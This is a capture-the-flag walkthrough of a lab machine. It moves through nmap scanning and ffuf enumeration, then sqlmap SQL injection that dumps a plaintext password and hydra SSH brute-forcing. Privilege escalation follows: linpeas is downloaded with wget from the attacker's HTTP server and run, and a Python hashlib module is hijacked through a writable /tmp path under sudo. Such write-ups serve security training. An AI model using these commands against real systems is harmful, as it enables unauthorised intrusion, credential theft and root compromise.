# OVerview
<img width="585" height="167" alt="Screenshot_2025-10-04_01-21-18" src="https://github.com/user-attachments/assets/34bdba68-a1d0-468c-aeac-93b17a8dd742" />

# Reconnaisance
Kicking start the gathering phase with `nmap`, but closely paying attention to the description of the room, I could see that it mentions keeping "quiet". Indirectly implying that I should use stealth scan mode for an effective output
```
 nmap -sN 10.201.111.18               
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-04 01:26 AEST
Stats: 0:00:23 elapsed; 0 hosts completed (1 up), 1 undergoing NULL Scan
NULL Scan Timing: About 99.99% done; ETC: 01:26 (0:00:00 remaining)
Nmap scan report for 10.201.111.18
Host is up (0.36s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE         SERVICE
22/tcp   open|filtered ssh
8000/tcp open|filtered http-alt

Nmap done: 1 IP address (1 host up) scanned in 24.86 seconds
```

I attempted to execute vulnerability lua script scan, but it was so aggressive that would disrupt the operation of the site
Instead of normal port 80 for HTTP service, this server uses unsual port 8000
<img width="1920" height="1003" alt="Screenshot_2025-10-04_01-28-19" src="https://github.com/user-attachments/assets/7d865b86-c132-4db6-ae7b-65d43f06e9a9" />


Next is endpoints enumeration phase
```
ffuf -c  -u "http://10.201.111.18:8000/FUZZ" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
...
login                   [Status: 200, Size: 856, Words: 43, Lines: 26, Duration: 412ms]
register                [Status: 200, Size: 964, Words: 51, Lines: 27, Duration: 414ms]
logout                  [Status: 302, Size: 218, Words: 21, Lines: 4, Duration: 339ms]

...
```

However, there are not anything look like sensitive information leakage or data exposure. I assume that I should switch to another technique, since the site is a login portal, which can potentially be vulnerable to SQLi. 
First I need to capture the request of the site and output it as a file called `request.txt`. Then using tool
```
sqlmap -r request.txt --dbs
...
[01:33:47] [INFO] fetching database names
available databases [3]:
[*] information_schema
[*] performance_schema
[*] website
...
```

I need the date inside that databse `website`
```
sqlmap -r request.txt -D website --dump
...
Database: website
Table: users
[1 entry]
+----+-------------------+----------------+----------+
| id | email             | password       | username |
+----+-------------------+----------------+----------+
| 1  | smokey@email.boop | My_P@ssW0rd123 | smokey   |
+----+-------------------+----------------+----------+
```

# Exploitation

<img width="1920" height="1004" alt="Screenshot_2025-10-04_01-37-41" src="https://github.com/user-attachments/assets/731b0fb1-9b09-44fa-a00a-6d77d260a6f6" />
Due to site login uselessness, I deduce that I might get access as `smokey` user in ssh of this server
```
ssh smokey@<ip>
```

I successfully get in as `smokey` now. After a while browsing, I found that inide `/home` folder, there is another user called `hazel`, which contains the user flag
<img width="476" height="134" alt="Screenshot_2025-10-04_01-41-38" src="https://github.com/user-attachments/assets/59b0d15a-2902-4017-857b-ba0c904b29d5" />

Well, I need the password for user `hazel` badly, so I use the tool known as `hydra` to brute-force the password of that user. 
```
hydra -l hazel -P /usr/share/wordlists/rockyou.txt 10.201.111.18 -I ssh
...
[22][ssh] host: 10.201.111.18   login: hazel   password: hazel
...
```

Wait a second, the password is exactly the same as the name, it is so easy to get access
<img width="329" height="45" alt="Screenshot_2025-10-04_01-45-55" src="https://github.com/user-attachments/assets/157e7e6f-4b96-45b3-9122-c1e2b6cf16b2" />
<img width="421" height="38" alt="Screenshot_2025-10-04_01-45-34" src="https://github.com/user-attachments/assets/9db16fdd-6fe6-4efd-92a1-68a5761eced1" />

# Privilege Escalation
Now I need to know which operating system does this server use by running nmap scan but with stealth mode
```
nmap -sT -O 10.201.111.18
```

And the operating system is linux, which is what I already expected. Moving to the `/tmp` folder for running linpeas by those following steps
1. On the main host, go to directory containing linpeas
Then setting up a python server
```
python3 -m http.server 80
```
2. On the target, using `wget` to get linpeas
```
wget http://<IPofMainHost>:80/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

Linpeas just gives me information about the shared python file called `hasher.py` which can be run by both `root` and `hazel`. The tricky thing is I couldn't have enough permission to alter the data inside that file. However, `/tmp` folder is writable.
I form a method that if I export the python environment to `/tmp`, inside `/tmp` I just create like a python file to read the flag. Then running `hasher.py` to trigger the payload as sudo, inside the `hasher.py` it actually import the library `hashlib`,
where I need to create a payload with the same name, injecting the payload and change the python path to make sure the payload is triggered.

Source code of `hasher.py`
<img width="395" height="444" alt="Screenshot_2025-10-04_02-05-57" src="https://github.com/user-attachments/assets/eefa15b4-897a-41da-96ca-5bb37841c98a" />



<img width="368" height="118" alt="Screenshot_2025-10-04_01-57-11" src="https://github.com/user-attachments/assets/6e3081d2-f427-4c4c-b8e0-bbc0695bbe0c" />

<img width="764" height="64" alt="Screenshot_2025-10-04_02-05-11" src="https://github.com/user-attachments/assets/21986653-bace-42cc-a5e5-94fe5d41ddbd" />

Done!!!! Happy Hacking!!!
